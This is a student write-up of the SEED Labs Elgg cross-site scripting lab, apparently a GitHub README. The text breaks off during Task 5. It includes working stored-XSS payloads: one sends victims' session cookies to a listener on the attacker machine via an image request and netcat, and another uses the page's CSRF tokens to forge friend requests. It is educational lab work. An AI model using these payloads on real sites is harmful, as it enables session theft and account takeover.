# cross-site-scripting
<p dir="auto">Instruction: <a href="https://seedsecuritylabs.org/Labs_16.04/PDF/Web_XSS_Elgg.pdf" rel="nofollow">https://seedsecuritylabs.org/Labs_16.04/PDF/Web_XSS_Elgg.pdf</a></p>
<h1 dir="auto"><a id="user-content-set-up" class="anchor" aria-hidden="true" href="#set-up"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Set-up</h1>
<ul dir="auto">
<li>attacker: <code>10.0.2.15</code></li>
<li>server: <code>10.0.2.4</code></li>
</ul>
<p dir="auto">Edit the DNS record in <code>/etc/hosts</code> on the attacker:</p>
<div class="snippet-clipboard-content position-relative overflow-auto"><pre><code>10.0.2.4       www.xsslabelgg.com
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="10.0.2.4       www.xsslabelgg.com
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<p dir="auto">Read the file <code>/etc/apache2/sites-available/000-default.conf</code>:</p>
<div class="snippet-clipboard-content position-relative overflow-auto"><pre lang="conf"><code>&lt;VirtualHost *:80&gt;
        ServerName http://www.xsslabelgg.com
        DocumentRoot /var/www/XSS/Elgg
&lt;/VirtualHost&gt;
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<VirtualHost *:80>
        ServerName http://www.xsslabelgg.com
        DocumentRoot /var/www/XSS/Elgg
</VirtualHost>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<p dir="auto">It shows that the sources of website <code>http://www.xsslabelgg.com</code> are hosted in <code>/var/www/XSS/Elgg</code></p>
<h1 dir="auto"><a id="user-content-task-1" class="anchor" aria-hidden="true" href="#task-1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Task 1</h1>
<p dir="auto">For Firefox, <code>Web Developer</code> -&gt; <code>Network</code> is also useful.</p>
<h2 dir="auto"><a id="user-content-task-11" class="anchor" aria-hidden="true" href="#task-11"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Task 1.1</h2>
<p dir="auto">Log in with account <code>alice</code> and password <code>seedalice</code>, then edit <code>Brief description</code> module in <code>Profile</code> as:</p>
<div class="highlight highlight-text-html-basic position-relative overflow-auto"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
  <span class="pl-en">alert</span><span class="pl-kos">(</span><span class="pl-s">"XSS"</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<script>
  alert(&quot;XSS&quot;);
</script>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<p dir="auto">And save it.</p>
<p dir="auto">Now, access <a href="http://www.xsslabelgg.com/profile/alice" rel="nofollow">http://www.xsslabelgg.com/profile/alice</a> from either the server or the attacker, an alert prompts:</p>
<p>Screenshoot in cross-site-scripting Folder</p>
<h1 dir="auto"><a id="user-content-task-2" class="anchor" aria-hidden="true" href="#task-2"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Task 2</h1>
<p dir="auto">Edit the <code>Brief description</code> module and save:</p>
<div class="highlight highlight-text-html-basic position-relative overflow-auto"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
  <span class="pl-en">alert</span><span class="pl-kos">(</span><span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">cookie</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<script>
  alert(document.cookie);
</script>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<p dir="auto">When accessing the profile page, it will show the cookie of the log-in user.</p>
<p dir="auto">When Boby opens the page, it will be</p>
<p>Screenshoot in cross-site-scripting Folder</p>
<p dir="auto">For Alice herself:</p>
<p>Screenshoot in cross-site-scripting Folder</p>
<h1 dir="auto"><a id="user-content-task-3" class="anchor" aria-hidden="true" href="#task-3"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Task 3</h1>
<p dir="auto">Edit the <code>Brief description</code> as:</p>
<div class="highlight highlight-text-html-basic position-relative overflow-auto"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span>
  <span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-en">write</span><span class="pl-kos">(</span>
    <span class="pl-s">"&lt;img src=http://10.0.2.15:5555?c="</span> <span class="pl-c1">+</span> <span class="pl-en">escape</span><span class="pl-kos">(</span><span class="pl-smi">document</span><span class="pl-kos">.</span><span class="pl-c1">cookie</span><span class="pl-kos">)</span> <span class="pl-c1">+</span> <span class="pl-s">" &gt;"</span>
  <span class="pl-kos">)</span><span class="pl-kos">;</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<script>
  document.write(
    &quot;<img src=http://10.0.2.15:5555?c=&quot; + escape(document.cookie) + &quot; >&quot;
  );
</script>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<p dir="auto">It will send an HTTP GET request to the port 5555 on the attacker with <code>document.cookie</code> whenever the profile page is accessed by any victim user.</p>
<p dir="auto">Then listen on the port 5555 on the attacker machine:</p>
<div class="snippet-clipboard-content position-relative overflow-auto"><pre><code>nc -l 5555 -v
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="nc -l 5555 -v
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<p dir="auto">Once visiting the profile page ( <a href="http://www.xsslabelgg.com/profile/alice" rel="nofollow">http://www.xsslabelgg.com/profile/alice</a>) from VM <code>10.0.2.4</code>, then it will appear on the attacker:</p>
<p>Screenshoot in cross-site-scripting Folder</p>
<h1 dir="auto"><a id="user-content-task-4" class="anchor" aria-hidden="true" href="#task-4"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Task 4</h1>
<p dir="auto">Try to log in as <code>alice</code> and add <code>samy</code> as a friend, during the process, <code>network</code> tool captures the request:</p>
<p dir="auto">HTTP header:</p>
<div class="snippet-clipboard-content position-relative overflow-auto"><pre><code>Request URL: http://www.xsslabelgg.com/action/friends/add?friend=47&amp;__elgg_ts=1589608177&amp;__elgg_token=VSvUwjnd17FwcB4BXzuRzQ&amp;__elgg_ts=1589608177&amp;__elgg_token=VSvUwjnd17FwcB4BXzuRzQ
GET /action/friends/add?friend=47&amp;__elgg_ts=1589608177&amp;__elgg_token=VSvUwjnd17FwcB4BXzuRzQ&amp;__elgg_ts=1589608177&amp;__elgg_token=VSvUwjnd17FwcB4BXzuRzQ HTTP/1.1
Host: www.xsslabelgg.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.xsslabelgg.com/profile/samy
X-Requested-With: XMLHttpRequest
Cookie: Elgg=5tqs9f0im6vp35cr2cva0lpvp4
Connection: keep-alive
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="Request URL: http://www.xsslabelgg.com/action/friends/add?friend=47&amp;__elgg_ts=1589608177&amp;__elgg_token=VSvUwjnd17FwcB4BXzuRzQ&amp;__elgg_ts=1589608177&amp;__elgg_token=VSvUwjnd17FwcB4BXzuRzQ
GET /action/friends/add?friend=47&amp;__elgg_ts=1589608177&amp;__elgg_token=VSvUwjnd17FwcB4BXzuRzQ&amp;__elgg_ts=1589608177&amp;__elgg_token=VSvUwjnd17FwcB4BXzuRzQ HTTP/1.1
Host: www.xsslabelgg.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.xsslabelgg.com/profile/samy
X-Requested-With: XMLHttpRequest
Cookie: Elgg=5tqs9f0im6vp35cr2cva0lpvp4
Connection: keep-alive
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<p dir="auto">So construct the payload that forges the user's friend request as:</p>
<div class="highlight highlight-text-html-basic position-relative overflow-auto"><pre><span class="pl-kos">&lt;</span><span class="pl-ent">script</span> <span class="pl-c1">type</span>="<span class="pl-s">text/javascript</span>"<span class="pl-kos">&gt;</span>
  <span class="pl-smi">window</span><span class="pl-kos">.</span><span class="pl-en">onload</span> <span class="pl-c1">=</span> <span class="pl-k">function</span> <span class="pl-kos">(</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
    <span class="pl-k">var</span> <span class="pl-v">Ajax</span> <span class="pl-c1">=</span> <span class="pl-c1">null</span><span class="pl-kos">;</span>
    <span class="pl-k">var</span> <span class="pl-s1">ts</span> <span class="pl-c1">=</span> <span class="pl-s">"&amp;__elgg_ts="</span> <span class="pl-c1">+</span> <span class="pl-s1">elgg</span><span class="pl-kos">.</span><span class="pl-c1">security</span><span class="pl-kos">.</span><span class="pl-c1">token</span><span class="pl-kos">.</span><span class="pl-c1">__elgg_ts</span><span class="pl-kos">;</span>
    <span class="pl-k">var</span> <span class="pl-s1">token</span> <span class="pl-c1">=</span> <span class="pl-s">"&amp;__elgg_token="</span> <span class="pl-c1">+</span> <span class="pl-s1">elgg</span><span class="pl-kos">.</span><span class="pl-c1">security</span><span class="pl-kos">.</span><span class="pl-c1">token</span><span class="pl-kos">.</span><span class="pl-c1">__elgg_token</span><span class="pl-kos">;</span>
    <span class="pl-c">//Construct the HTTP request to add Samy as a friend.</span>
    <span class="pl-k">var</span> <span class="pl-s1">sendurl</span> <span class="pl-c1">=</span>
      <span class="pl-s">"http://www.xsslabelgg.com/action/friends/add?friend=47"</span> <span class="pl-c1">+</span> <span class="pl-s1">ts</span> <span class="pl-c1">+</span> <span class="pl-s1">token</span><span class="pl-kos">;</span> <span class="pl-c">//FILL IN</span>
    <span class="pl-c">//Create and send Ajax request to add friend</span>
    <span class="pl-v">Ajax</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-v">XMLHttpRequest</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
    <span class="pl-v">Ajax</span><span class="pl-kos">.</span><span class="pl-en">open</span><span class="pl-kos">(</span><span class="pl-s">"GET"</span><span class="pl-kos">,</span> <span class="pl-s1">sendurl</span><span class="pl-kos">,</span> <span class="pl-c1">true</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
    <span class="pl-v">Ajax</span><span class="pl-kos">.</span><span class="pl-en">setRequestHeader</span><span class="pl-kos">(</span><span class="pl-s">"Host"</span><span class="pl-kos">,</span> <span class="pl-s">"www.xsslabelgg.com"</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
    <span class="pl-v">Ajax</span><span class="pl-kos">.</span><span class="pl-en">setRequestHeader</span><span class="pl-kos">(</span><span class="pl-s">"Content-Type"</span><span class="pl-kos">,</span> <span class="pl-s">"application/x-www-form-urlencoded"</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
    <span class="pl-v">Ajax</span><span class="pl-kos">.</span><span class="pl-en">send</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
  <span class="pl-kos">}</span><span class="pl-kos">;</span>
<span class="pl-kos">&lt;/</span><span class="pl-ent">script</span><span class="pl-kos">&gt;</span></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<script type=&quot;text/javascript&quot;>
  window.onload = function () {
    var Ajax = null;
    var ts = &quot;&amp;__elgg_ts=&quot; + elgg.security.token.__elgg_ts;
    var token = &quot;&amp;__elgg_token=&quot; + elgg.security.token.__elgg_token;
    //Construct the HTTP request to add Samy as a friend.
    var sendurl =
      &quot;http://www.xsslabelgg.com/action/friends/add?friend=47&quot; + ts + token; //FILL IN
    //Create and send Ajax request to add friend
    Ajax = new XMLHttpRequest();
    Ajax.open(&quot;GET&quot;, sendurl, true);
    Ajax.setRequestHeader(&quot;Host&quot;, &quot;www.xsslabelgg.com&quot;);
    Ajax.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
    Ajax.send();
  };
</script>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<p dir="auto">Log in with username <code>samy</code> and password <code>seedsamy</code>.</p>
<p dir="auto">Add the code above in <code>Profile</code> -&gt; <code>About me</code> by <code>edit html</code> mode.</p>
<p dir="auto">Now on the VM <code>10.0.2.4</code>, sign in as Boby and visit Samy's profile(<a href="http://www.xsslabelgg.com/profile/samy" rel="nofollow">http://www.xsslabelgg.com/profile/samy</a>), without any extra action, just refresh the page, it shows that Samy is already your (i.e. Boby) friend.</p>
<h1 dir="auto"><a id="user-content-task-5" class="anchor" aria-hidden="true" href="#task-5"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Task 5</h1>
<p dir="auto">When editing a user's (Alice) own profile legally, the <code>network</code> tool captures such an HTTP POST request:</p>
<div class="snippet-clipboard-content position-relative overflow-auto"><pre><code>Request URL: http://www.xsslabelgg.com/action/profile/edit
__elgg_token=VSvHyrizEfLuFJUoNPOQXg
__elgg_ts=1589672946
name=Alice
description=&lt;p&gt;dsadsa&lt;/p&gt;
